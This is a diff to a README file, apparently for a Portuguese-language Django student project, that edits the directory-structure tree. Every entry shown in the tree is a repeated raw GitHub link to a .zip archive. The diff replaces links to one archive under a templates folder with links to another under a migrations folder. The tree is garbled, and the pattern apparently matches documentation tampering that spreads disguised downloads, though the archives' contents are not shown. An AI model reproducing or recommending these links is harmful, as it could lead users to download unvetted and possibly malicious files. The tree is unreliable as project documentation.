@@ -25,18 +25,18 @@ nome_do_projeto/
 │   ├── migrations/
 │   ├── templates/
 │   ├── static/
-│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-│   └── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   ├── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+│   ├── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+│   ├── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+│   ├── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+│   ├── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+│   └── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+├── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
 ├── nome_do_projeto/
-│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-│   ├── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-│   └── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
-└── https://raw.githubusercontent.com/banananerds/pjfinal-proweb-20242/main/app_gestao_proj/templates/app_gestao_proj/proweb_pjfinal_v3.5-alpha.1.zip
+│   ├── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+│   ├── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+│   └── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
+└── https://github.com/banananerds/pjfinal-proweb-20242/raw/refs/heads/main/app_salas_reuniao/migrations/pjfinal_proweb_2.8.zip
 ```
 
 ## Funcionalidades do Sistema
